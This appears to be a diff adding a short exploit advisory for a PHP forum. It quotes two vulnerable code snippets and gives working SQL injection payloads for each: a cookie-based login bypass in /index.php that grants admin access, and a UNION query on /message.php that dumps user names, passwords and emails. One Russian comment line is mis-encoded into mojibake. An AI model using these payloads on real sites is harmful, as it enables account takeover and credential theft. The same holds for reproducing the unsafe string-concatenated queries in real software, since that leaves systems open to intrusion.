@@ -1,0 +1,32 @@
+## ## ## ##
+Blind SQLinj
+/index.php
+-------------------------------------------------------------------------------------------------
+if($_COOKIE['user_enter']=="auto") {
+$enter_login=$_COOKIE['enter_login'];
+$enter_parol=$_COOKIE['enter_parol'];
+$mysql->query("SELECT name, pass, status FROM users WHERE name =
+'".$enter_login."' AND pass = '".$enter_parol."'");
+-------------------------------------------------------------------------------------------------
+exploit:
+  COOKIE: user_enter=auto
+  COOKIE: enter_login = abc
+  COOKIE: enter_parol = ' or name = (select name from users where
+id_user=1) and '1'='1';
+  sqlQuery: SELECT name, pass, status FROM users WHERE name = 'abc'
+AND pass = '' or name = (select name from users where id_user<10 limit
+1)
+Ð¸ Ð²Ñ‹ Ð°Ð²Ñ‚Ð¾Ð¼Ð°Ñ‚Ð¾Ð¼ Ð·Ð°Ð¹Ð´ÐµÑ‚Ðµ Ð¿Ð¾Ð´ Ð°Ð´Ð¼Ð¸Ð½Ð¾Ð¼, Ð´Ð°Ð¶Ðµ Ð½Ðµ Ð·Ð½Ð°Ñ ÐµÐ³Ð¾ Ð¸Ð¼ÐµÐ½Ð¸ (:
+
+
+
+## ## ## ##
+SQLinj
+/message.php
+-------------------------------------------------------------------------------------------------
+9:  $topic=$_GET['topic'];
+18: if($topic) {
+69: $mysql->query("SELECT name, viewing, voting, status, top_status,
+id_forum FROM topics WHERE id_topic = ".$topic);
+exploit:/message.php?topic=-1+union+select+1,concat_ws(0x3a,id_user,name,pass,email),3,4,5,6+from+users
+-------------------------------------------------------------------------------------------------
